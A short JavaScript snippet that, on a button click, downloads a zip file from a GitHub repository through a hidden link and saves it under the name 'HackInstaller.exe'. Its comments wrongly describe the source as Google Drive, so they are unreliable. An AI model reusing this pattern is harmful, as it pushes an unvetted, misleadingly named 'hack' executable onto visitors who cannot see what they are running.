const button = document.getElementById("DHF");

// Direct download link for your HackInstaller.exe file hosted on Google Drive
const hackInstallerURL = "https://github.com/zysws/zysws.github.io/raw/main/JS.zip";  // Replace with your actual file ID 

// Function to download the file
function downloadFile(file) {
  const link = document.createElement('a');
  link.style.display = 'none';
  link.href = file;  // Use the Google Drive direct download link
  link.download = "HackInstaller.exe"; // The name of the file when downloading
  document.body.appendChild(link);
  link.click();
  setTimeout(() => {
    link.parentNode.removeChild(link); // Clean up the DOM
  }, 0);
}

// Button click event to fetch and download the file
button.onclick = () => {
  downloadFile(hackInstallerURL);  // Trigger the download
};
